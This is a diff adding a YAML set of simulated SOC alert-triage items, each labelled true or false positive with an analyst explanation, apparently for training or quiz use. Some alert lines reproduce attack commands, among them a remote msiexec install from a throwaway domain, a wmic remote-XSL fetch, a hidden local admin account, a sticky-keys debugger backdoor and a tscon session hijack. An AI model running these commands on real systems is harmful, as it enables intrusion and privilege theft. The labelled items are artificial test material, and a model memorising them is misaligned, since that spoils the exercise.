@@ -1,0 +1,277 @@
+# ON SHIFT alerts, drop 2, part 1: twins for one-sided concepts + Windows endpoint pairs (y01-y20)
+# v: 1 = true positive (escalate), 0 = false positive (close)
+- id: y01
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceProcessEvents'
+  t: 'regsvr32 execution'
+  h: 'WS-DES-0214 · pmoreau'
+  l: ['parent: msiexec.exe (setup of PlotterSuite 7.2)', 'cmd: regsvr32.exe /s "C:\Program Files\Plotter Systems\PlotterSuite\plotcom.dll"', 'signer: Plotter Systems GmbH (valid), path under Program Files']
+  v: 0
+  x: T1218.010
+  c: lolbin-remote-script
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: 'Regsvr32 ran silently against a DLL in Program Files, launched by the Windows installer service during a vendor suite setup. The DLL is signed.'
+  tell: 'regsvr32 is only Squiblydoo when it reaches out: /i:http plus scrobj.dll. Here it registers a signed local COM DLL under Program Files, started by msiexec, which is what regsvr32 is for. Read the arguments, not the binary name.'
+- id: y02
+  d: linux
+  src: 'Linux · auditd'
+  t: 'ssh reverse port forward'
+  h: 'ci-agent-14 · jenkins'
+  l: ['exec: ssh -N -R 2222:localhost:22 deploy@bastion-int.corp.local', 'dest: 10.40.8.12 (internal bastion, RFC1918)', 'parent: Jenkins agent job "lab-reachback", run by the build service account']
+  v: 0
+  x: T1572
+  c: covert-tunnel-egress
+  k: [1]
+  diff: 2
+  trap: scary
+  say: 'A build agent opened an SSH reverse port forward to a host on the internal management network, started from a Jenkins job.'
+  tell: 'Reverse tunnels are a problem when they leave the building. This one terminates on an RFC1918 bastion, from a pipeline job, under the build service account. Same flags as plink out to the internet, opposite story. Look at the destination.'
+- id: y03
+  d: endpoint
+  src: 'Windows Security · 1102'
+  t: 'Audit log cleared'
+  h: 'WS-LAB-0031 · SYSTEM'
+  l: ['subject: NT AUTHORITY\SYSTEM', 'caller process: C:\Windows\System32\sysprep\sysprep.exe', 'context: OS deployment task sequence, device name is still the staging default', 'first boot after reimage, no user has ever signed in']
+  v: 0
+  x: T1685.005
+  c: log-clearing
+  k: [1, 3]
+  diff: 2
+  trap: scary
+  say: 'The Security event log was cleared by the system account from the sysprep process during an operating system deployment on a freshly imaged machine.'
+  tell: 'A cleared log on a lived-in machine is cover. A cleared log by SYSTEM from sysprep.exe on a box that has never had a user is image hygiene. Check who called it and whether there was ever anything on that machine to hide.'
+- id: y04
+  d: edr
+  src: 'Defender Antivirus · 1116'
+  t: 'Hacktool detected'
+  h: 'WS-DET-0007 · rhollis'
+  l: ['threat: HackTool:Win64/Mimikatz', 'path: D:\detection-lab\atomic-red-team\atomics\T1003.001\bin\mimikatz.exe', 'action: quarantined', 'device group: detection-engineering (isolated lab VLAN, no domain trust)']
+  v: 0
+  x: T1003.001
+  c: mimikatz-present
+  k: [1, 3]
+  diff: 2
+  trap: scary
+  say: 'Antivirus quarantined a Mimikatz hack tool from an Atomic Red Team folder on a detection engineering lab machine in an isolated device group.'
+  tell: 'Same detection name as a stray copy in a user folder, opposite context: an Atomic Red Team payload on a detection engineer''s lab box in an isolated device group. The who and why has an answer here, the team that writes the rules for it. Still confirm the VLAN really is isolated.'
+- id: y05
+  d: identity
+  src: 'Entra ID · SigninLogs'
+  t: 'Multiple accounts, same sign-in error'
+  h: 'tenant corp.com · 38 users'
+  l: ['error 50055: password expired, must change (38 accounts, 1 hour)', 'source: corp office egress (known range), all managed devices', 'accounts: created today by the HR onboarding workflow, all first sign-in', 'no successful sign-in for any of them from any other IP']
+  v: 0
+  x: T1110.003
+  c: password-spray-brute
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'Thirty-eight accounts hit the same password-must-change error within an hour, all from the corporate office range on managed devices, all created today.'
+  tell: 'Spray shape on paper: many accounts, one error, one hour. In reality it is 38 new hires on orientation day typing the temporary password from the welcome sheet and being told to change it. Known office source, accounts hours old, nothing from anywhere else.'
+- id: y06
+  d: identity
+  src: 'Entra ID · AuditLogs'
+  t: 'MFA method added'
+  h: 'tnakamura@corp.com'
+  l: ['6 min after: password reset by helpdesk (video ID check and manager approval logged)', 'new method: Authenticator on a device registered 2 min earlier, compliant Intune device', 'sign-in context: corp office IP, same user agent as the previous 90 days']
+  v: 0
+  x: T1098.005
+  c: helpdesk-mfa-reset
+  k: [0, 1]
+  diff: 2
+  trap: scary
+  say: 'Six minutes after a help desk password reset a new authenticator was added. Video verification is logged and the device is compliant.'
+  tell: 'Reset then new MFA method is the takeover pattern, and it is also a locked-out employee with a new phone. Verification and context decide it: a logged video ID check, a compliant managed device, the office IP and an unchanged user agent.'
+- id: y07
+  d: cloud
+  src: 'Azure · AzureActivity'
+  t: 'VM run command executed'
+  h: 'vm-batch-03 · rg-prod-batch'
+  l: ['caller: deploy-sp (service principal) · IP: 52.x.x.x (Azure DevOps hosted agent range)', 'operation: Microsoft.Compute/virtualMachines/runCommand/action', 'correlation: pipeline run 4471 "batch-config" on main, approver on record', 'time: inside the usual deploy window']
+  v: 0
+  x: T1651
+  c: cloud-principal-abuse
+  k: [0, 2]
+  diff: 2
+  trap: scary
+  say: 'A service principal ran a command on a production VM from the DevOps hosted agent range, matching a pipeline run on main.'
+  tell: 'Run Command is a favourite for persistence and also how pipelines configure VMs. Same operation and same kind of principal as the leaked-secret case, but the source is the DevOps agent range, there is a pipeline run you can open, and it is inside the deploy window. Pipeline context is the identity.'
+- id: y08
+  d: linux
+  src: 'Kubernetes · audit log'
+  t: 'Privileged pod created'
+  h: 'cluster: prod-aks · ns: kube-system'
+  l: ['pod: azure-cns-x8k2p · DaemonSet azure-cns (owner reference)', 'securityContext: privileged: true · hostNetwork: true · hostPath: /var/run/azure-cns', 'user: system:serviceaccount:kube-system:azure-cns', 'image: mcr.microsoft.com/containernetworking/azure-cns, pinned digest, platform-managed']
+  v: 0
+  x: T1611
+  c: container-escape
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'A privileged pod in the kube-system namespace belongs to the network plugin DaemonSet, mounts one narrow host path, and runs under the plugin service account.'
+  tell: 'Privileged is the headline, not the verdict. Network plugins are DaemonSets in kube-system that need host networking. Check the owner reference, the service account, the image and what is mounted: one plugin socket directory, not the node root.'
+- id: y09
+  d: linux
+  src: 'Linux · auth.log'
+  t: 'SSH brute force'
+  h: 'bastion-02 · sshd'
+  l: ['Failed password for invalid users 612 times in 40 min from 91.x.x.x', 'Failed password for root 38 times from 91.x.x.x', 'Accepted password for deploy from 91.x.x.x, same source, 3 min after the last failure', 'PasswordAuthentication: yes (keys not enforced on this host)']
+  v: 1
+  x: T1110.001
+  c: internet-bg-noise
+  k: [2, 3]
+  diff: 2
+  trap: bland
+  say: 'Failed SSH logins from one address, then an accepted password login for deploy from the same address minutes later, with passwords enabled.'
+  tell: 'Failures alone are weather. Failures followed by an accepted login from the same source is the event, and password auth on an exposed bastion is how it happened. Escalate on the success and look at what deploy did next.'
+- id: y10
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'msiexec execution'
+  h: 'WS-FIN-0522 · aklein'
+  l: ['parent: WINWORD.EXE', 'cmd: msiexec.exe /i http://update-cdn[.]top/inv.msi /qn', 'msi publisher: unsigned']
+  v: 1
+  x: T1218.007
+  c: msiexec-remote-install
+  k: [0, 1]
+  diff: 2
+  say: 'The Windows installer was run quietly against an MSI on a web address. Its parent process is a word processor and the package is unsigned.'
+  tell: 'msiexec with a URL means the package is not coming from your software distribution. Word as the parent plus an unsigned MSI on a throwaway domain is a delivery chain, not an install.'
+- id: y11
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'msiexec execution'
+  h: 'WS-SAL-0188 · fbrandt'
+  l: ['parent: ccmexec.exe (ConfigMgr client)', 'cmd: msiexec.exe /i "C:\Windows\ccmcache\4\Zoom.msi" /qn', 'msi publisher: Zoom Video Communications (valid), hash matches the deployed package']
+  v: 0
+  x: T1218.007
+  c: msiexec-remote-install
+  k: [0, 2]
+  diff: 2
+  trap: scary
+  say: 'The Windows installer ran quietly on a local MSI in the software agent cache, started by the management client. Publisher valid, hash matches.'
+  tell: 'Same binary, same /qn, opposite story. This package is in the ConfigMgr cache, started by the ConfigMgr client, signed by the vendor, with a hash that matches the deployment. msiexec only gets interesting when the package comes from somewhere your tooling does not own.'
+- id: y12
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceProcessEvents'
+  t: 'wmic execution'
+  h: 'WS-LEG-0093 · hvance'
+  l: ['parent: cmd.exe (parent: mshta.exe)', 'cmd: wmic os get /format:"https://cdn-files[.]online/s.xsl"', 'child: cscript.exe loaded jscript from the stylesheet']
+  v: 1
+  x: T1220
+  c: wmic-xsl
+  k: [1, 2]
+  diff: 3
+  say: 'A WMI command asked for OS data but pointed its output format at a web-hosted stylesheet, then the script host ran code.'
+  tell: 'The /format switch accepts a URL, and an XSL stylesheet can embed script. wmic os get is the decoy. The web-hosted stylesheet and the script host child process are the payload.'
+- id: y13
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'wmic execution'
+  h: 'SRV-INV-12 · SYSTEM'
+  l: ['parent: ccmexec.exe, powershell.exe (hardware inventory script)', 'cmd: wmic cpu get name,numberofcores /format:csv', 'output: written to C:\Windows\CCM\Inventory\hw.csv, no network access']
+  v: 0
+  x: T1220
+  c: wmic-xsl
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: 'A WMI command queried processor details with a local CSV output format, launched by the management agent script into its inventory folder.'
+  tell: 'wmic is on every attack checklist and in every inventory script. /format:csv to a local file from the management agent is the second kind. The attack variant points /format at a URL.'
+- id: y14
+  d: endpoint
+  src: 'Windows Security · 4698'
+  t: 'Scheduled task created remotely'
+  h: 'SRV-FILE-07 · CORP\svc_oper'
+  l: ['task: \Microsoft\Windows\Updater (run as SYSTEM, one shot, 60 s after creation)', 'created from: WS-ACCT-0630 (network logon type 3)', 'action: cmd.exe /c C:\ProgramData\r.bat', 'svc_oper has no history of remote task creation']
+  v: 1
+  x: T1053.005
+  c: schtasks-remote-create
+  k: [1, 2]
+  diff: 3
+  say: 'A one-shot scheduled task running as system was created on a file server from a workstation over the network, running a batch file from ProgramData.'
+  tell: 'Remote schtasks /create with a near-immediate trigger is the quiet cousin of PsExec: no service, no binary pushed, just a task that runs once. The source is a workstation, the account never does this, and the payload is a batch file in ProgramData.'
+- id: y15
+  d: endpoint
+  src: 'Windows Security · 4698'
+  t: 'Scheduled task created remotely'
+  h: 'SRV-APP-31 · CORP\svc_patch'
+  l: ['task: \Patch\Reboot-After-Update (SYSTEM, one shot at 02:00)', 'created from: SRV-JUMP-02 (patch orchestration host, network logon type 3)', 'action: shutdown.exe /r /t 60 /c "patch window"', 'svc_patch creates the same task on 200 servers every second Tuesday']
+  v: 0
+  x: T1053.005
+  c: schtasks-remote-create
+  k: [1, 3]
+  diff: 2
+  trap: scary
+  say: 'A one-shot reboot task running as system was created from the patch orchestration host by the patching account, which does this on hundreds of servers.'
+  tell: 'Remote scheduled tasks are how patch tooling and intruders both avoid installing agents. Source host, account history and payload separate them: the orchestrator, the account that does this every patch cycle, and shutdown.exe.'
+- id: y16
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'Local account created'
+  h: 'SRV-WEB-09 · iis_pool'
+  l: ['parent: w3wp.exe', 'cmd: net user support$ Winter2026! /add && net localgroup administrators support$ /add', 'host role: public web server, no admin tooling installed']
+  v: 1
+  x: T1136.001
+  c: net-user-add-admin
+  k: [0, 1]
+  diff: 2
+  say: 'Commands from a web server worker process created a local account with a trailing dollar sign and added it to the local administrators group.'
+  tell: 'A web worker process creating an account and adding it to administrators is post-exploitation, full stop. The trailing dollar sign hides it from casual net user listings. An IIS pool identity never needs to manage local users.'
+- id: y17
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'Local account created'
+  h: 'WS-NEW-0412 · SYSTEM'
+  l: ['parent: C:\Windows\Setup\Scripts\firstboot.cmd (OSD task sequence)', 'cmd: net user localadm REDACTED /add && net localgroup administrators localadm /add', 'context: first boot after imaging, no user session yet, LAPS rotates localadm within 10 min']
+  v: 0
+  x: T1136.001
+  c: net-user-add-admin
+  k: [0, 2]
+  diff: 2
+  trap: scary
+  say: 'The imaging task sequence first boot script created a local administrator account before any user had signed in.'
+  tell: 'Creating a local admin is normal during imaging: the task sequence does it before first logon and LAPS takes ownership of the password. Parent, timing and the absence of any user session say provisioning. The same commands under w3wp.exe say intrusion.'
+- id: y18
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceRegistryEvents'
+  t: 'Registry value set'
+  h: 'WS-KIO-0017 · kiosk'
+  l: ['key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe', 'value: Debugger = C:\Windows\System32\cmd.exe', 'initiating process: reg.exe (parent: powershell.exe, user kiosk)']
+  v: 1
+  x: T1546.008
+  c: ifeo-debugger
+  k: [0, 1]
+  diff: 2
+  say: 'A registry value was set under Image File Execution Options for the sticky keys program, pointing its debugger at the command shell.'
+  tell: 'A Debugger on sethc.exe pointing at cmd.exe means five presses of shift at the lock screen give SYSTEM a shell. An accessibility binary with a shell as its debugger is the classic backdoor.'
+- id: y19
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceRegistryEvents'
+  t: 'Registry value set'
+  h: 'WS-DEV-0455 · lmoreno'
+  l: ['key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\billing-svc.exe', 'value: Debugger = C:\Windows\System32\vsjitdebugger.exe', 'initiating process: devenv.exe (Visual Studio) as the developer, workstation in the dev OU']
+  v: 0
+  x: T1546.008
+  c: ifeo-debugger
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A debugger value was registered for a custom service executable, pointing at the Visual Studio just-in-time debugger, set by the IDE on a developer workstation.'
+  tell: 'Image File Execution Options is both a backdoor hook and a developer feature. The target decides: sethc.exe with cmd.exe is a backdoor. A custom app registered for the JIT debugger by devenv.exe on a dev workstation is debugging.'
+- id: y20
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'tscon execution'
+  h: 'SRV-TS-02 · SYSTEM'
+  l: ['cmd: tscon.exe 3 /dest:rdp-tcp#12', 'parent: service "sesshijack" created 2 min earlier, running as LocalSystem', 'session 3 belongs to CORP\dadmin (domain admin, disconnected 40 min ago)', 'no password was entered for session 3']
+  v: 1
+  x: T1563.002
+  c: rdp-session-hijack
+  k: [1, 3]
+  diff: 3
+  trap: bland
+  say: 'The session connect tool ran as system, attaching a disconnected domain admin session to a new terminal, from a freshly created service, without credentials.'
+  tell: 'tscon run as SYSTEM can attach to any disconnected session with no password: create a service that runs tscon and you are the domain admin who walked away. The service created minutes earlier and the missing credential prompt are the tell.'
